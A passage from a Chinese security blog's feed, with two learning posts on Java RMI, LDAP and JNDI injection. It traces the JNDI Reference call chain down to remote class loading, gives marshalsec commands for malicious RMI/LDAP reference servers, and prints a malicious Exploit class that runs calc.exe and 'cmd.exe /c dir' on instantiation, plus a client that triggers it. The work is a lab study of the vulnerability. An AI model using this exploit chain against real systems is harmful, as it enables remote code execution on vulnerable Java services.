alt="image.png"></p><p>这里的流程就是我们用<code>lookup(url)</code>获取远程对象时会获取到一个<code>Reference</code>对象，然后客户首先会去本地的<code>classpath</code>寻找被标识为<code>refClassName</code>的类，如果本地未找到，就会去请求我们所定义的远程地址的<code>refClassName.class</code>，然后就会动态加载<code>class</code></p><p>这里我用的是<code>Java</code>7u21的版本，换成<code>Java</code>8的版本之后就不行了，因为在<code>6u141,7u131,8u121</code>之后，新增了 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>选项，默认为<code>false</code>，禁止<code>RMI</code>和<code>CORBA</code>协议使用远程<code>codebase</code>选项，虽然该更新阻止了<code>RMI</code>和<code>CORBA</code>触发漏洞，但是我们仍然可以使用<code>LDAP</code>协议进行攻击，随后在<code>6u211,7u201.8u191</code>中，又新增了 <code>com.sun.jndi.ldap.object.trustURLCodebase</code>选项，默认为<code>false</code>，禁止<code>LDAP</code>协议使用远程<code>codebase</code>选项</p><p>只不过嘛，说是这么说，不过总是有办法可以绕的嘛，后面的文章再来说这个</p><p><code>ldap</code>的复现就看我上一篇文章了哈</p><h2 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h2><p>接下来我们就来看看它的调用流程，也就是漏洞的原理，调用链很长，大家做好心理准备哈哈，我还是建议大家也下个断点来自己调试哈</p><p>首先进入到<code>InitialContext</code>类中的<code>lookup</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="comment">//getURLOrDefaultInitCtx函数会分析name的协议头返回对应协议的环境对象，此处返回Context对象的子类rmiURLContext对象</span></span><br><span class="line">        <span class="comment">//然后在对应协议中去lookup搜索，我们进入lookup函数</span></span><br><span class="line">        <span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>getURLOrDefaultInitctx</code>获取到了一个<code>rmiURLContext</code>，所以说进入到<code>GenericURLContext</code>类中的<code>lookup</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="comment">//此处this为rmiURLContext类调用对应类的getRootURLContext类为解析RMI地址</span></span><br><span class="line">    <span class="comment">//不同协议调用这个函数，根据之前getURLOrDefaultInitCtx(name)返回对象的类型不同，执行不同的getRootURLContext</span></span><br><span class="line">    <span class="comment">//进入不同的协议路线</span></span><br><span class="line">    ResolveResult var2 = <span class="keyword">this</span>.getRootURLContext(var1, <span class="keyword">this</span>.myEnv);<span class="comment">//获取RMI注册中心相关数据</span></span><br><span class="line">    Context var3 = (Context)var2.getResolvedObj();<span class="comment">//获取注册中心对象</span></span><br><span class="line"></span><br><span class="line">    Object var4;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var4 = var3.lookup(var2.getRemainingName());<span class="comment">//去注册中心调用lookup查找，我们进入此处，传入name-evil</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        var3.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>var3</code>是一个注册中心<code>RegistryContext</code>对象，所以说它会进入到<code>RegistryContext</code>类中的<code>lookup</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RegistryContext(<span class="keyword">this</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">//判断来到这里</span></span><br><span class="line">        Remote var2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = <span class="keyword">this</span>.registry.lookup(var1.get(<span class="number">0</span>));<span class="comment">//RMI客户端与注册中心通讯，返回RMI服务IP，地址等信息</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(var1.get(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));<span class="comment">//我们进入此处</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会返回ip、端口等信息，继续走，进入到<code>decodeObject</code>方法里面：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//注意到上面的服务端代码，我们在RMI服务端绑定的是一个Reference对象，世界线在这里变动</span></span><br><span class="line">            <span class="comment">//如果是Reference对象会，进入var.getReference()，与RMI服务器进行一次连接，获取到远程class文件地址。</span></span><br><span class="line">            <span class="comment">//如果是普通RMI对象服务，这里不会进行连接，只有在正式远程函数调用的时候才会连接RMI服务。</span></span><br><span class="line">            Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">            <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">            <span class="comment">//获取reference对象进入此处</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var5;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            NamingException var4 = <span class="keyword">new</span> NamingException();</span><br><span class="line">            var4.setRootCause(var7);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进，进入到<code>NamingManager</code>类中的<code>getObjectInstance</code>方法中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getObjectInstance</span><span class="params">(Object refInfo, Name name, Context nameCtx,Hashtable&lt;?,?&gt; environment)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="comment">// Use builder if installed</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// Use reference if possible</span></span><br><span class="line">    Reference ref = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;<span class="comment">//满足</span></span><br><span class="line">        ref = (Reference) refInfo;<span class="comment">//复制</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;<span class="comment">//不进入</span></span><br><span class="line">        ref = ((Referenceable)(refInfo)).getReference();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object answer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="keyword">null</span>) &#123;<span class="comment">//进入此处</span></span><br><span class="line">        String f = ref.getFactoryClassName();<span class="comment">//函数名 ExecTest</span></span><br><span class="line">        <span class="keyword">if</span> (f != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//任意命令执行点1（构造函数、静态代码），进入此处</span></span><br><span class="line">            factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">            <span class="keyword">if</span> (factory != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">//任意命令执行点2（覆写getObjectInstance），</span></span><br><span class="line">                <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                    environment);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> refInfo;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// if reference has no factory, check for addresses</span></span><br><span class="line">            <span class="comment">// containing URLs</span></span><br><span class="line"></span><br><span class="line">            answer = processURLAddrs(ref, name, nameCtx, environment);</span><br><span class="line">            <span class="keyword">if</span> (answer != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> answer;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>继续跟进<code>getObjectFactoryFromReference</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ObjectFactory <span class="title">getObjectFactoryFromReference</span><span class="params">(Reference ref, String factoryName)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IllegalAccessException,InstantiationException,MalformedURLException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Class clas = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//尝试从本地获取该class</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">            clas = helper.loadClass(factoryName);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// ignore and continue</span></span><br><span class="line">        <span class="comment">// e.printStackTrace();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如果不在本地classpath，从cosebase中获取class</span></span><br><span class="line">    String codebase;</span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="keyword">null</span> &amp;&amp; (codebase = ref.getFactoryClassLocation()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">//此处codebase是我们在恶意RMI服务端中定义的http://127.0.0.1:80/</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//从我们放置恶意class文件的web服务器中获取class文件</span></span><br><span class="line">            clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//实例化我们的恶意class文件</span></span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="keyword">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就在这里实例化了，实例化会默认调用构造方法，以及静态代码块，就在这里实现了任意代码执行</p><h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><p>上一篇文章我们讲过的<code>marshalsec</code>工具不仅可以起一个<code>ldap</code>服务器，同样也可以起一个<code>rmi</code>服务器，语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rmi:  java -cp mar*.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:80/\#Exploit 1089</span><br><span class="line">ldap:  java -cp mar*.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:80/\#Exploit 1089</span><br></pre></td></tr></table></figure><p>所以说咱复现的时候其实用工具起服务器会更加方便一点儿</p><p>参考文章：</p><ul><li><a href="https://xz.aliyun.com/t/6633#toc-7">https://xz.aliyun.com/t/6633#toc-7</a></li><li><a href="https://evilpan.com/2021/12/13/jndi-injection/#ldap-1">https://evilpan.com/2021/12/13/jndi-injection/#ldap-1</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;JNDI注入&quot;&gt;&lt;a href=&quot;#JNDI注入&quot; class=&quot;headerlink&quot; title=&quot;JNDI注入&quot;&gt;&lt;/a&gt;JNDI注入&lt;/h1&gt;&lt;p&gt;前面做了做铺垫，这篇文章就来正式进入&lt;code&gt;jndi&lt;/code&gt;注入的学习，其实也不算特别难，就是链子有点儿长，得耐心下来&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java篇之RMI &amp; LDAP</title>
    <link href="https://arsenetang.github.io/2022/03/20/Java%E7%AF%87%E4%B9%8BRMI&amp;LDAP/"/>
    <id>https://arsenetang.github.io/2022/03/20/Java%E7%AF%87%E4%B9%8BRMI&amp;LDAP/</id>
    <published>2022-03-19T16:00:00.000Z</published>
    <updated>2022-03-20T07:41:44.355Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RMI-amp-LDAP"><a href="#RMI-amp-LDAP" class="headerlink" title="RMI &amp; LDAP"></a>RMI &amp; LDAP</h1><p>这篇文章来总结两个基础知识，<code>rmi</code>和<code>ldap</code>，内容比较简单，为后面的<code>jndi</code>和<code>fastjson</code>做个铺垫</p><span id="more"></span><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>RMI<code>(Remote Method Invocation)</code>，即Java远程方法调用，一种用于实现<a href="https://zh.m.wikipedia.org/wiki/%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8">远程过程调用</a>的<a href="https://zh.m.wikipedia.org/wiki/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3">应用程序编程接口</a>，它使客户机上运行的程序可以通过网络实现调用远程服务器上的对象，要实现<code>RMI</code>，客户端和服务端需要共享同一个接口，先来看看服务端：</p><p>接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">evil</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">eviltest</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">eviltest</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">evil</span><span class="params">()</span>  <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">rmiserver</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1089</span>);</span><br><span class="line">        evil evil = <span class="keyword">new</span> eviltest();</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1089/evil&quot;</span>, evil);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们在kali中编写客户端，因为要实现远程方法调用嘛，那就相当于用我的虚拟机去调我的真机，这里有个细节就是客户端的包名也要和服务端的相同；接口代码和服务端是一样的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">rmiclienr</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        evil evil = (evil) Naming.lookup(<span class="string">&quot;rmi://10.24.38.47:1089/evil&quot;</span>);</span><br><span class="line">        evil.evil();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行这段代码，真机弹出计算器：</p><p><img src="https://s2.loli.net/2022/03/20/3FgmhIHoMZOTrGJ.png" alt="image.png"></p><p>上面这个例子，就为我们展现了一个很简单的rmi远程通信，接下来来总结总结：</p><p>一个<code>RMI</code>的服务器分为三部分，首先是一个继承了<code>java.rmi.Remote</code>的接口，里面有我们要远程调用的方法；然后是一个实现了该接口的类；最后是一个主类，首先创建并运行<code>RMI Registry</code>，然后将实现类对象绑定到<code>evil</code>这个名字上，这就是<code>RMI</code>服务器</p><p><code>RMI</code>的客户端就非常简单了，利用<code>Naming.lookup</code>方法在地址中去寻找我们绑定的对象，然后将这对象返回，接下来就和本地用法一样了</p><p>偷一张p神的图就把这些关系说清楚了：</p><p><img src="https://s2.loli.net/2022/03/20/wLiGJNSo2DaM5V3.png" alt="image.png"></p><p><code>RMI Registry</code>就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但<code>RMI Server</code>可以在上⾯注册⼀个<code>Name</code>到对象的绑定关系；<code>RMI Client</code>通过<code>Name</code>向<code>RMI Registry</code>查询，得到这个绑定关系，然后再连接<code>RMI Server</code>；最后，远程⽅法实际上在<code>RMI Server</code>上调⽤，很清晰</p><h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>LDAP<code>(Lightweight Directory Access Protocol)</code>，轻型目录访问协议，是一个开放的，中立的，工业标准的<a href="https://zh.wikipedia.org/w/index.php?title=%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE&action=edit&redlink=1">应用协议</a>，通过<a href="https://zh.wikipedia.org/wiki/IP%E5%8D%8F%E8%AE%AE">IP协议</a>提供访问控制和维护分布式信息的<a href="https://zh.wikipedia.org/wiki/%E7%9B%AE%E5%BD%95_(%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F)">目录</a>信息。</p><p>其实<code>ldap</code>的流程与上面的<code>rmi</code>基本一致，它主要能储存以下<code>Java</code>对象：</p><ol><li>Java serializable objects</li><li>Referenceable objects and JNDI References</li><li>Objects with attributes (DirContext)</li><li>RMI (Java Remote Method Invocation) objects (including those that use IIOP)</li><li>CORBA objects</li></ol><p>而这里我们主要用的是第二点，也就是<code>Reference</code>对象，这个讲<code>jndi</code>的时候再来讲，不慌</p><p>这里我们来推荐一个工具，<code>marshalsec</code>，<code>marshalsec</code>是一个快速搭建恶意的<code>rmi</code>或者<code>ldap</code>服务器的工具</p><p>下载地址：<a href="https://github.com/RandomRobbieBF/marshalsec-jar">https://github.com/RandomRobbieBF/marshalsec-jar</a></p><p>我们首先把编译好的恶意类<code>Exploit.class</code>放到web根目录下面，这里我直接放在<code>WWW</code>目录下面了，打开<code>phpstudy</code>就能访问了</p><p>恶意类的源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String cmd = <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">            </span><br><span class="line">            Runtime runtime = Runtime.getRuntime();</span><br><span class="line">            Process process = runtime.exec(<span class="string">&quot;cmd.exe /c dir&quot;</span>);</span><br><span class="line">            InputStream inputStream = process.getInputStream();</span><br><span class="line">            BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(inputStream, <span class="string">&quot;gb2312&quot;</span>));</span><br><span class="line">            <span class="keyword">while</span>(br.readLine()!=<span class="keyword">null</span>)</span><br><span class="line">                System.out.println(br.readLine());</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里看起来有点儿复杂，因为我想执行个<code>dir</code>目录并且看到回显，这在Java中显得有点儿费劲</p><p>然后用<code>marshalsec</code>搭建<code>ldap</code>服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp mar*.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:80/\#Exploit 1089</span><br></pre></td></tr></table></figure><p>最后来写个客户端，这个简单，就两行代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ladp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        Object object=<span class="keyword">new</span> InitialContext();</span><br><span class="line">        ((InitialContext) object).lookup(<span class="string">&quot;ldap://127.0.0.1:1089/Exploit&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/20/7WZGMkJ9ULPsnej.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/03/20/h7rC1ns2w8RWquJ.png" alt="image.png"></p><p>水文一篇哈哈哈，最近学的有点儿散，打脑壳得很</p>]]></content>
    
    
